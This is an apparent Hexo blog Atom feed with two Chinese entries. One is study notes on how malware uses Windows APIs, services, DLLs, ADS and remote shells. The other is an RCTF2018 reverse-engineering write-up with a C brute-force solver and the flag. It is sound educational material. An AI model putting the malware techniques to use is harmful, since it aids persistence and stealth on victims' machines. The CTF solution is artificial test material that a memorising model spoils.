<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K&#39;s House</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kabeor.github.io/"/>
  <updated>2018-06-14T04:15:50.010Z</updated>
  <id>https://kabeor.github.io/</id>
  
  <author>
    <name>kabeor</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第七章 分析恶意Windows程序</title>
    <link href="https://kabeor.github.io/%E7%AC%AC%E4%B8%83%E7%AB%A0%20%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8FWindows%E7%A8%8B%E5%BA%8F/"/>
    <id>https://kabeor.github.io/第七章 分析恶意Windows程序/</id>
    <published>2018-06-07T11:26:41.389Z</published>
    <updated>2018-06-14T04:15:50.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第七章-分析恶意Windows程序"><a href="#第七章-分析恶意Windows程序" class="headerlink" title="第七章 分析恶意Windows程序"></a>第七章 分析恶意Windows程序</h1><h2 id="7x1-Windows-API"><a href="#7x1-Windows-API" class="headerlink" title="7x1 Windows API"></a>7x1 Windows API</h2><h3 id="1-类型和匈牙利表达法"><a href="#1-类型和匈牙利表达法" class="headerlink" title="1. 类型和匈牙利表达法"></a>1. 类型和匈牙利表达法</h3><p>Windows总体上使用匈牙利表达法作为API函数标识符，表达式使用前缀命名模式</p><blockquote><p>Windows API常见类型<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180607/ljD9G7L4hD.png?imageslim" alt="mark"></p></blockquote><h3 id="2-句柄"><a href="#2-句柄" class="headerlink" title="2. 句柄"></a>2. 句柄</h3><p>句柄是在操作系统中被打开或被创建的项(一个窗口，进程，模块，菜单，文件等)<br>句柄不能用来做数学操作<br>我们所能做的只有保存它，并在后续函数调用中使用它来引用同一个对象</p><h3 id="3-文件系统函数"><a href="#3-文件系统函数" class="headerlink" title="3. 文件系统函数"></a>3. 文件系统函数</h3><p>恶意代码与系统交互的一个最常用的方式就是创建或修改文件<br>独特文件名或修改为既有文件名是明显的基于主机的感染迹象</p><blockquote><p>CreateFile</p></blockquote><p>用来创建和打开文件，可打开已存在的文件，管道，流，及I/O设备，能创建新文件</p><blockquote><p>ReadFile和WriteFile</p></blockquote><p>用来对文件进行读和写操作</p><blockquote><p>CreatFileMapping和MapViewOfFile</p></blockquote><p>从磁盘加载一个文件到内存和返回一个指向映射的基地址指针(可用来访问内存中的文件)</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180607/fh5E4Klf4K.png?imageslim" alt="mark"></p><h3 id="4-特殊文件"><a href="#4-特殊文件" class="headerlink" title="4. 特殊文件"></a>4. 特殊文件</h3><blockquote><p>共享文件</p></blockquote><p>以\serverName\share或\?\serverName\share开头命名的特殊文件，用来访问在共享目录中的目录或文件</p><blockquote><p>通过名字空间访问的文件</p></blockquote><p>名字空间可以被认为是固定数目的文件夹，每一个文件夹中保存不同类型的对象。底层的名字空间是NT名字空间，以前缀＼开始。NT名字空间可以访问所有设备，以及所有在NT名字空间中存在的其他名字空间。</p><p>以前缀\.\开始的Win32设备名字空间，经常被恶意代码用来直接访问物理设备，并且像一个文件一样进行读写操作</p><p>使用\Device\PhysicalMemory 来直接访问物理内存，这允许用户空间程序写到内核空间中。这个技术已经被恶意代码用来修改内核，并隐藏用户空间的程序。</p><blockquote><p>备用数据流</p></blockquote><p>备用数据流(ADS）特性允许附加数据被添加到一个已存在的NTFS文件中，相当于添加一 个文件到另外一 文件中。额外数据在列一 个目录时不会被显示出来，并且当显示文件内容时也不显示；而只有在你访问流时，它才是可见的。<br>ADS数据流根据约定normalFile.txt:Stream:$DATA来命名，这允许一个程序去读写一个流。恶意代码作者喜欢ADS，因为它能被用来隐藏数据。</p><h2 id="7x2-Windows注册表"><a href="#7x2-Windows注册表" class="headerlink" title="7x2 Windows注册表"></a>7x2 Windows注册表</h2><p>Windows注册表被用来保存操作系统与程序的配置信息<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180608/DC19e4JDkh.png?imageslim" alt="mark"></p><h3 id="1-注册表根键"><a href="#1-注册表根键" class="headerlink" title="1. 注册表根键"></a>1. 注册表根键</h3><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180608/6BkL9HagKK.png?imageslim" alt="mark"></p><h3 id="2-Regedit"><a href="#2-Regedit" class="headerlink" title="2. Regedit"></a>2. Regedit</h3><p>注册表编辑器，Windows内建的用来查看和编辑注册表的工具</p><h3 id="3-自启动程序"><a href="#3-自启动程序" class="headerlink" title="3. 自启动程序"></a>3. 自启动程序</h3><p>向Run子键中写入项，可设置程序自启动<br>Autoruns工具列举在操作系统启动时会自动启动运行的代码</p><h3 id="4-常用注册表函数"><a href="#4-常用注册表函数" class="headerlink" title="4. 常用注册表函数"></a>4. 常用注册表函数</h3><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180608/I759acBkee.png?imageslim" alt="mark"></p><h3 id="5-练习分析注册表操作代码"><a href="#5-练习分析注册表操作代码" class="headerlink" title="5. 练习分析注册表操作代码"></a>5. 练习分析注册表操作代码</h3><h3 id="6-使用-reg文件的注册表脚本"><a href="#6-使用-reg文件的注册表脚本" class="headerlink" title="6. 使用.reg文件的注册表脚本"></a>6. 使用.reg文件的注册表脚本</h3><h2 id="7x3-网络API"><a href="#7x3-网络API" class="headerlink" title="7x3 网络API"></a>7x3 网络API</h2><h3 id="1-伯克利兼容套接字"><a href="#1-伯克利兼容套接字" class="headerlink" title="1. 伯克利兼容套接字"></a>1. 伯克利兼容套接字</h3><p>网络功能在Windows系统中由Winsock库实现，主要在ws2_32.dll中<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180609/lceAddKc3b.png?imageslim" alt="mark"><br>WSAStartup函数必须在其他网络函数之前被调用<br>调试代码查找网络接口时，可在WSAStartup函数中设置断点</p><h3 id="2-网络的服务器和客户端"><a href="#2-网络的服务器和客户端" class="headerlink" title="2. 网络的服务器和客户端"></a>2. 网络的服务器和客户端</h3><p>一个网络程序通常有两个端点:服务器端，它维护一个打开套接字并等待入站连接：客户端，它连接到一个正在等待的套接字。而恶意代码可以是这两端中的任意一个。</p><h3 id="3-WinINet-API"><a href="#3-WinINet-API" class="headerlink" title="3. WinINet API"></a>3. WinINet API</h3><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180609/EmJch1aEH2.png?imageslim" alt="mark"></p><h2 id="7x4-跟踪恶意代码的运行"><a href="#7x4-跟踪恶意代码的运行" class="headerlink" title="7x4 跟踪恶意代码的运行"></a>7x4 跟踪恶意代码的运行</h2><h3 id="1-DLL"><a href="#1-DLL" class="headerlink" title="1. DLL"></a>1. DLL</h3><blockquote><p>动态链接库（DLL)是使用库来在多个应用程序之间共享代码的Windows特有方式。一个DLL程序是不能独自运行的可执行文件，但它可以导出一些被其他应用程序使用的函数。<br>被DLL程序使用的内存可以在正运行的进程之间共享。<br>在发布一个可执行文件时，你可以使用Windows系统上已 知的DLL程序，而无须去重新发布它们。这帮助软件开发者和恶意代码作者最小化发布软件的大小规模。<br>DLL程序也是一种有用的代码复用方式</p></blockquote><h4 id="恶意代码作者如何使用DLL"><a href="#恶意代码作者如何使用DLL" class="headerlink" title="恶意代码作者如何使用DLL"></a>恶意代码作者如何使用DLL</h4><blockquote><p>保存恶意代码<br>通过使用Windows DLL<br>通过使用第三方DLL</p></blockquote><h4 id="基本DLL结构"><a href="#基本DLL结构" class="headerlink" title="基本DLL结构"></a>基本DLL结构</h4><blockquote><p>DLL使用PE文件格式，并且只有一个单一标志，指示这个文件是一个<br>DLL,而不是一个.exeDLL经常有更多导出函数，并且通常导入函数较少。<br>DLL的主函数是DllMain。它没有标记，而且并不是一个DLL中的导出函数，但是它在PE头中被指定为文件的入口点。任何时候一个进程加载或卸载库，会创建一个新线程，或一个已程结束时，这个函数都会被调用来通知DLL。这个通知允许DLL来管理每个进程或每个线程的资源存在的线<br>程的资源。</p></blockquote><h3 id="2-进程"><a href="#2-进程" class="headerlink" title="2. 进程"></a>2. 进程</h3><h4 id="创建一个新进程"><a href="#创建一个新进程" class="headerlink" title="创建一个新进程"></a>创建一个新进程</h4><p>恶意代码最常使用的创建新进程函数是CreateProcess</p><blockquote><p>恶意代码通常使用C reateP rocess,来创建一个简单的远程shell- CreateProcess函数的一个参数，STARTUPINFO结构，包含一个进程的标准输入、标准输出以及标准错误流的句柄。一个恶意程序可以设置这些值为套接字，这样当这个程序写入标准输出时，它实际上会写到套接字上，因而允许一个攻击者执行远程shell,而不需要运行除CreateProcess之外的任何函数。</p></blockquote><h3 id="3-线程"><a href="#3-线程" class="headerlink" title="3. 线程"></a>3. 线程</h3><p>进程是执行代码的容器，线程才是Windows操作系统真正要执行的内容。线程是被CPU执行的独立指令序列，而不需要等待其他线程。一个进程包含一个或多个线程，它们执行进程中的一部分代码。一个进程中的所有线程共享同样的内存空间，但是每一个有它自己的处理器、寄存器和栈。</p><h4 id="线程上下文"><a href="#线程上下文" class="headerlink" title="线程上下文"></a>线程上下文</h4><blockquote><p>当一个线程运行时，它对CPU或CPU核有着完全的控制，并且其他线程不能影响CPU或核的状态。当一个线程改变CPU中某个寄存器的值时，它不会影响任何其他线程。一个操作系统在线程间切换之前，在CPU中的所有值会被保存到一个称为线程上下文的结构体中。然后操作系统加载这个线程上下文到一个新的线程中，并使这个新线程在CPU中执行</p></blockquote><h4 id="创建一个线程"><a href="#创建一个线程" class="headerlink" title="创建一个线程"></a>创建一个线程</h4><blockquote><p>CreateThread函数被用来创建一个新线程。函数的调用者指定一个起始地址，它经常被叫做sta rt函数。执行从这个起始地址开始直到这个函数返回，尽管这个函数不需要返回，这个线程可以在进程结束前一直运行。<br>CreateThread的调用者可以指定线程开始的函数位置，并且一个单一参数可以被传递给这个start函数。这个参数可以是任意值，依赖于这个线程要开始执行的函数。</p><p>• 恶意代码可以使用CreateThread,来加载一个新的恶意库文件到进程中，通过在调用CreateThread时将起始地址设置为Load Library的地址。 （传递给CreateThread的参数是要被加载库的名字。新的DLL被加载到这个进程的内存中，然后DllMain被调用。）<br>• 恶意代码可以为输入和输出创建两个线程：一个用来在套接字或管道上监听，并输出到一个进程的标准输入里，另一个用来从标准输出读取数据，并发送到套接字或管道上，恶意代码的目标是发送所有信息到单一的套接字或管道，来和运行的应用程序进行无缝通信。</p></blockquote><h3 id="4-使用互斥量的进程间协作"><a href="#4-使用互斥量的进程间协作" class="headerlink" title="4. 使用互斥量的进程间协作"></a>4. 使用互斥量的进程间协作</h3><blockquote><p>互斥量（mutex), 在内核中也称为互斥门（mutant)是全局对象，用于协调多个进程和线程。<br>互斥量主要用于控制共享资源的访问，并且经常被恶意代码所使用。<br>同一时刻，只有一个线程拥有一个互斥量。</p><p>线程通过一个对WaitForSingleObject的调用，获取对互斥量的访问，井且任何后续线程试图获取对它的访问时，都必须等待。当一个线程完成对互斥量的使用后，需要使用ReleaseMutex函数。</p><p>一个互斥量可以通过CreateMutex函数进行创建。而进程可以通过OpenMutex调用来获取另一个进程中互斥量的句柄。恶意代码通常创建一个互斥量，并试图使用同一个名字来打开一个已存在的互斥量，通过这种方式，可以确定恶意代码一次只有一个唯一实例在运行。</p></blockquote><h3 id="5-服务"><a href="#5-服务" class="headerlink" title="5. 服务"></a>5. 服务</h3><p>恶意代码执行附加代码的另一种方式是将它作为服务安装。Windows允许通过使用服务，来使任务作为后台应用程序运行，而不需要它们自己的进程或线程；代码被Windows服务管理器调度和运行，但没有用户输入。在Windows操作系统上的任何指定时间，都会有多个服务在运行。</p><p>服务也提供另一种在系统上维护持久化驻留的方式，因为它们可以被设置成当操作系统启动时 自动运行，并且可能甚至不在任务管理器中作为一个进程显示出来。一个用户查找所有运行的应用程序，也不会找到任何可疑的东西，因为恶意代码不是运行在一个独立进程中。</p><p>服务可以通过一些Windows API函数来进行安装和操作</p><blockquote><p>OpenSCManager： 返回一个服务控制管理器的句柄，它被用来进行所有后续与服务相关的函数调用。所有要和服务交互的代码会调用这个函数。<br>CreateService： 添加一个新服务到服务控制管理器，并且允许调用者指定服务是否在引导时自动启动，或者必须手动启动。<br>StartService： 启动一个服务，并且仅在服务被设置成手动启动时使用。</p></blockquote><p>Windows操作系统支持多种服务类型，它们以独特的方式执行。恶意代码最常使用的是WIN32_SHARE_PR0CESS类型，这种类型将这个服务的代码保存在一个DLL中，并且在一个共享的进程中组合多个同的服务。在任务管理器中，你可以找到一个名为svchost.exe进程的多个实例，它们在运行WIN32_SHARE_PR0CESS类型的服务。</p><blockquote><p>WIN32_OWN_PROCESS类型有时也被使用，因为它在一个.exe文件中保存代码，而且作为一个独立进程运行。</p><p>最后一个常见的服务类型是KERNEL_DRIVER,它被用来加载代码到内核中执行。</p><p>关于本地系统上服务的信息被保存在注册表中。每个服务在HKLM\SYSTEM\CurrentControlSet\Services下面有一个子键。</p></blockquote><h3 id="6-组件对象模型"><a href="#6-组件对象模型" class="headerlink" title="6. 组件对象模型"></a>6. 组件对象模型</h3><p>微软组件对象模型（COM)是一个接口标准，它使得不同软件组件在不知道其他组件代码的接口规范时，相互之间可以进行调用。</p><p>COM可以支持任何编程语言，并且被设计成一种可复用的软件组件，并可以被所有程序所利用。COM使用了一个对象结构，在与面向对象的编程语言中可以很好配合使用，COM也并不排斥非面向对象的编程语言。</p><p>COM被实现成一个客户-服务器框架。客户端是那些使用COM对象的程序，服务器是那些可复用的软件组件——也就是COM对象本身。微软提供了很多COM对象给程序使用。</p><p>每一个使用COM的线程，必须在调用任何其他COM库函数之前，至少调用一次Olelnitialize或CoInitializeEx函数。所以，一个恶意代码分析师可以搜索这些调用，来判断一个程序是否使用了COM功能，然而，知道恶意代码片段作为客户端程序使用COM对象并没有提供很多信息，因为COM对象是繁杂且广泛的。一旦你判断程序在使用COM,你就需要找到一些正在被使用对象的标识符来继续分析。</p><h4 id="CLSID、IID-以及COM对象的使用"><a href="#CLSID、IID-以及COM对象的使用" class="headerlink" title="CLSID、IID ,以及COM对象的使用"></a>CLSID、IID ,以及COM对象的使用</h4><blockquote><p>COM对象通过它们的全局唯一标识符(GUID),分为类型标识符(CLSID)以及接口标识符(IID)来进行访问。</p><p>CoCreatelnstance函数被用来获取对COM功能的访问。恶意代码使用的一个常用函数是Navigate , 它允许一个 程 序 启 动 Internet Explorer, 并访问一 个 Web地 址。Navigate函数是IWebBrowser2组件接口的一部分，这个接口指定了一个必须被实现的函数列表，但是它没有指定哪个程序会提供这个功能。提供这个功能的程序就是实现了IWebBrowser2接口的COM类。在多数例子中，IWebBrowser2接口被Internet Explorer实现。接口通过一个叫做IID的GUID来标识，而COM类通过一个叫做CLS1D的GUID来标识。</p></blockquote><h4 id="COM服务器恶意代码"><a href="#COM服务器恶意代码" class="headerlink" title="COM服务器恶意代码"></a>COM服务器恶意代码</h4><p>有些恶意代码实现了一个恶意COM服务器，继而被其他应用使用。对恶意代码来说，常用的COM服务器功能是通过浏览器帮助对象（B H O ), 这是Internet Explorer的第三方插件。BHO没有限制，所以恶意代码作者使用它们在Internet Explorer®程中运行代码，这允许他们监控互联网流量、跟踪浏览器的使用，以及与互联网通信，而且并不使用它们自己的进程。</p><p>实现一个COM服务器的恶意代码通常很容易检测，因为它导出了几个函数，包括DllCanUnloadNow、DllGetClassObject、Dlllnstall、DI 1 RegisterServer, 以及DllUnregisterServer，它们都必须由COM服务器软件导出。</p><h3 id="7-异常：当事情出错时"><a href="#7-异常：当事情出错时" class="headerlink" title="7. 异常：当事情出错时"></a>7. 异常：当事情出错时</h3><p>异常机制允许一个程序在普通执行流程之外处理事件。多数时间里，异常是由错误引起的，诸如除零错误。当一个异常发生时，执行转移到处理这个异常的特殊例程。有些异常，比如除零异常，是由硬件抛出的；其他的，比如无效内存访问，是由操作系统抛出的。你也可以在代码中使用RaiseException调用，显式地抛出一个异常。</p><p>结构化异常处理(SEH)是Windows的异常处理机制。在一个32位系统中，SEH信息被保存在桟上。</p><p>异常处理器是可嵌套的，并且不是所有的处理器都会对应着所有异常。如果当前帧的异常处理器不处理这个异常，这个异常会被传递给调用者帧的异常处理器。最终，如果这些异常处理器中没有一个响应这个异常，那么顶层的异常处理器将使应用程序崩溃。</p><p>异常处理器可以让恶意代码获得执行机会。一个指向异常处理信息的指针被保存在栈上，在栈溢出时，一个攻击者可以覆盖这个指针。通过指定一个新的异常处理器，攻击者可以在一个异常发生时获得执行机会。</p><h2 id="7x5-内核与用户模式"><a href="#7x5-内核与用户模式" class="headerlink" title="7x5 内核与用户模式"></a>7x5 内核与用户模式</h2><p>Windows使用两种处理器特权级别：内核模式与用户模式。</p><p>几乎所有代码都运行在用户模式，除了操作系统和硬件驱动，它们运行在内核模式。在用户模式，每一个进程有它自己的内存、安全权限，以及资源。如果一个用户模式程序执行一个无效指令并崩溃，Windows可以回收所有资源，并终止这个程序</p><p>通常，用户模式不能直接访问硬件，并且它被限制只能访问CPU上所有寄存器和可用指令的一个子集。为了在用户模式中操作硬件或改变内核中的状态，你必须依赖于Windows API。</p><p>当你调用一个Windows API函数操作内核结构体时，它会通过一个调用进入内核。在反汇编中SYSENTER、SYSCALL或者INT 0x2E的存在，指明一个调用被使用进入到内核。直接通过跳转从用户模式到内核模式是不可能的，这些指令使用查找表来定位一个预定义函数，从而在内核中执行代码。</p><p>所有运行在内核的进程共享资源和内存地址。内核模式代码有更少的安全检查。如果在内核运行的代码执行并且包含无效指令，操作系统就不能继续运行，产生的结果就是著名的Windows蓝屏。</p><p>运行在内核中的代码可以操纵运行在用户空间的代码，但是运行在用户空间的代码只能通过定义好的接口来影响内核。即使所有运行在内核的代码共享内存和资源，处于活跃状态的进程上下文也总是只有一个。</p><h2 id="7x6-原生API"><a href="#7x6-原生API" class="headerlink" title="7x6 原生API"></a>7x6 原生API</h2><p>原生API是用来和Windows进行交互的底层API。<br>调用原生API函数可以绕过普通的Windows API。</p><p>当调用Windows API中的一个函数时，这个函数通常不会直接执行请求的动作，因为大多数重要数据结构都被保存在内核中，在内核外面的代码 （用户模式代码）是无法访问它们的。微软为了使用户应用程序能够达到必需的功能，创建了一个多步骤的调用过程。<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180614/aLi8ahEFg3.png?imageslim" alt="mark"></p><p>用户应用程序被给予对用户API (比如kernel32.dll和其他DLL)的访问，这些DLL会调用ntdlLdll,这是一个特殊的DLL程序，它管理用户空间与内核的交互。然后处理器切换到内核模式,并执行一个内核中的函数，通常它位于ntoskrnl.exe中。这个过程是令人费解的，但是内核和用户API之间的分离，允许微软修改内核而不会影响应用程序。</p><p>ntdll函数像内核中的函数一样，使用API和结构体。这些函数组成了原生API。</p><blockquote><p>尽管微软不提供关于原生API的完整文档，还是有网站和书来文档化这些函数。最好的参考书是由GaryNebbett (Sams, 2000)撰写的Windows NT/2000 Native API Reference，尽管它已经很旧了。在线资源如 <a href="http://undocumented.ntinternals.net" target="_blank" rel="noopener">http://undocumented.ntinternals.net</a> 以提供最近的信息。</p></blockquote><p>有一系列的原生API调用可以被用来获取关于系统的信息、进程、线程、句柄，以及其他项目。这 些 包 括 NtQuerySystemlnformation , NtQuerylnformationProcess &gt; NtQuerylnformationThread &gt; NtQuerylnformationFile, 以及NtQuerylnformationKey。这些调用提供比任何可用Win32调用更详细的信息，并且其中一些函数允许你给文件、进程、线程等设置细粒度的属性。</p><p>另一个恶意代码普遍使用的原生API函数是NtContinue。这个函数被用来从一个异常处理返回，并且它的意图是在一个异常被处理后转移执行回到一个程序的主线程。然而，要返回的位置在异常上下文中被指定，并且它可以被修改。恶意代码经常使用这个函数来以复杂的方式转移执行，从而使一个分析师感到困惑，并且使一个程序更加难调试。</p><p>原生应用程序是那些不使用Win32子系统而只调用原生API的应用程序。这样的应用程序对恶意代码来说是罕见的，对非恶意代码来说几乎是不存在的，所以一个原生应用程序很可能就是恶意的。在PE头中的子系统指明了一个程序是不是原生应用程序。</p><p>From <a href="https://kabeor.github.io/第七章 分析恶意Windows程序/">https://kabeor.github.io/第七章 分析恶意Windows程序/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第七章-分析恶意Windows程序&quot;&gt;&lt;a href=&quot;#第七章-分析恶意Windows程序&quot; class=&quot;headerlink&quot; title=&quot;第七章 分析恶意Windows程序&quot;&gt;&lt;/a&gt;第七章 分析恶意Windows程序&lt;/h1&gt;&lt;h2 id=&quot;7x1-W
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2018 babyre WriteUp</title>
    <link href="https://kabeor.github.io/RCTF2018%20babyre%20WriteUp/"/>
    <id>https://kabeor.github.io/RCTF2018 babyre WriteUp/</id>
    <published>2018-05-23T02:17:44.286Z</published>
    <updated>2018-06-07T11:11:09.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCTF2018-babyre-WriteUp"><a href="#RCTF2018-babyre-WriteUp" class="headerlink" title="RCTF2018 babyre WriteUp"></a>RCTF2018 babyre WriteUp</h1><p>题目给了一个压缩包，里面有两个文件<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/B22Ai4Ebg0.png?imageslim" alt="mark"></p><p>out文件<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/f8khGAh1lK.png?imageslim" alt="mark"></p><p>这种题型应该就是<strong>得到算法后枚举，与正确输出的out作比较</strong></p><p>那么首先拿IDA看一下吧</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>先搜索一下字符串吧<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/djIcIh9a87.png?imageslim" alt="mark"><br>可以看到这些有用的提示，使用交叉引用到汇编指令</p><p>用图形化看一下(最后一张有一点歪了，请原谅)</p><blockquote><p>main函数 0x08048B49<br>比较长，挑重点</p></blockquote><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/l0m9Di186a.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/K3il4DDed0.png?imageslim" alt="mark"></p><blockquote><p>返回输出流程 0x804882B</p></blockquote><p> <img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/DkHgmBa86m.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/cFJ8D8Gg1L.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/56kcEm2hD3.png?imageslim" alt="mark"></p><p>注意到那个红色的报错了吗，是的，我们现在无法F5<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/daLHAL88i7.png?imageslim" alt="mark"></p><p>显示<strong>sp分析失败</strong><br>经过搜索学习，明白了这种问题一般都是堆栈不平衡导致的，因此我们需要手动调整栈指针</p><p>首先 菜单栏OPtions-&gt;General<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/FEIlIkF8di.png?imageslim" alt="mark"></p><p>打上勾<br>然后回到汇编窗口，找到loc_80848CBB</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/BBbe9c97ja.png?imageslim" alt="mark"></p><p>观察发现，lea和retn处的栈指针都是00，导致问题的出现，因此我们应该运用堆栈平衡原理，将其平衡</p><p>具体来说，想要修改一个位置的指针，需要将鼠标指向这个指针的上一个指针，然后 Alt+K</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/B7L5DHjFj9.png?imageslim" alt="mark"></p><p>将里面的0x9C修改为0x0，确认<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/16kH3gi6fa.png?imageslim" alt="mark"></p><p>现在堆栈平衡，就可以F5了</p><p>当然了，还可以选择GDB动态调试，在出错这里下断点，然后步入看汇编，但因为对汇编看的还不是很熟悉，GDB也不常接触，于是只能F5了(流下没技术的泪水)</p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>F5看一下<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/252L5cgJ8k.png?imageslim" alt="mark"></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/6b0J1K4FB8.png?imageslim" alt="mark"></p><p>主函数判断输入格式，v4处可以看到，是将其<strong>八位即四字节一组(int大小为2字节，8/2=4)</strong>进行分组</p><p>然后sub_804882B内是回显<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/7Lj0EhB99A.png?imageslim" alt="mark"></p><p>sub_8048A41和sub_8048980不太清楚是干嘛的，应该是初始化和转换之类的</p><p><strong>算法位于sub_80488E0内</strong></p><p>先记住<strong>sub_80488E0(&amp;v6, 0xA72BE4C1, 0x1D082C23, seed, v4, v3);</strong>，后面有用</p><h3 id="内部"><a href="#内部" class="headerlink" title="内部"></a>内部</h3><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/8H7i6cJmJ7.png?imageslim" alt="mark"></p><p>看到一个30次的循环，嵌套sub_804868B<br>进去看看</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/b90D76k3jm.png?imageslim" alt="mark"></p><p>现在整个算法的全貌就展示在了我们面前</p><p>逐位循环0x20F次换算成四字节一组也就是0x20F/4=0x7F<br>于是我们只需要从0x20到0x7F进行枚举，按照相应算法对out进行比较即可,注意80488E0一开始传入的两个字符串需要互换然后合并</p><p>解题脚本如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">uint32_t foo(uint32_t a1, uint64_t a2) // sub_804868B</span><br><span class="line">&#123;</span><br><span class="line">    int j;</span><br><span class="line">    uint64_t v5;</span><br><span class="line">    uint32_t in;</span><br><span class="line">    in = a1;</span><br><span class="line">    for (j = 0; j &lt;= 527; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = a2 &gt;&gt; (j &amp; 0x1F);</span><br><span class="line">        if (j &amp; 0x20)</span><br><span class="line">            v5 = v5 &gt;&gt; 32;           //高低位转换 </span><br><span class="line">        in = (in &gt;&gt; 1) ^ ((v5 ^ in ^ (in &gt;&gt; 16) ^ (0x5C743A2E &gt;&gt; (((in &gt;&gt; 1) &amp; 1)</span><br><span class="line">            + 2</span><br><span class="line">            * (2</span><br><span class="line">                * (((in &gt;&gt; 20) &amp; 1)</span><br><span class="line">                    + 2* (2 * (in &gt;&gt; 31) + ((in &gt;&gt; 26) &amp; 1)))</span><br><span class="line">                + ((in &gt;&gt; 9) &amp; 1))))) &lt;&lt; 31);</span><br><span class="line">    &#125;</span><br><span class="line">    return in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t data[30] = // out</span><br><span class="line">    &#123;</span><br><span class="line">        0xB80C91FE,0x70573EFE,</span><br><span class="line">        0xBEED92AE,0x7F7A8193,</span><br><span class="line">        0x7390C17B,0x90347C6C,</span><br><span class="line">        0xAA7A15DF,0xAA7A15DF,</span><br><span class="line">        0x526BA076,0x153F1A32,</span><br><span class="line">        0x545C15AD,0x7D8AA463,</span><br><span class="line">        0x526BA076,0xFBCB7AA0,</span><br><span class="line">        0x7D8AA463,0x9C513266,</span><br><span class="line">        0x526BA076,0x6D7DF3E1,</span><br><span class="line">        0xAA7A15DF,0x9C513266,</span><br><span class="line">        0x1EDC3864,0x9323BC07,</span><br><span class="line">        0x7D8AA463,0xFBCB7AA0,</span><br><span class="line">        0x153F1A32,0x526BA076,</span><br><span class="line">        0xF5650025,0xAA7A15DF,</span><br><span class="line">        0x1EDC3864,0xB13AD888</span><br><span class="line">    &#125;;</span><br><span class="line">    int i;</span><br><span class="line">    uint32_t j;</span><br><span class="line">    for (i = 0; i &lt; 30; i++)</span><br><span class="line">        for (j = 0x20; j &lt; 0x7F; j++)                    //0x20F/4=0x7F </span><br><span class="line">            if (foo(j, 0x1D082C23A72BE4C1) == data[i])   //互换，合并 </span><br><span class="line">                printf(&quot;%c&quot;, j);</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180523/jHmlDahLfJ.png?imageslim" alt="mark"></p><p>解出： RCTF{Kee1o9_1s_a1ready_so1ved}</p><p>From <a href="https://kabeor.github.io/RCTF2018 babyre WriteUp/">https://kabeor.github.io/RCTF2018 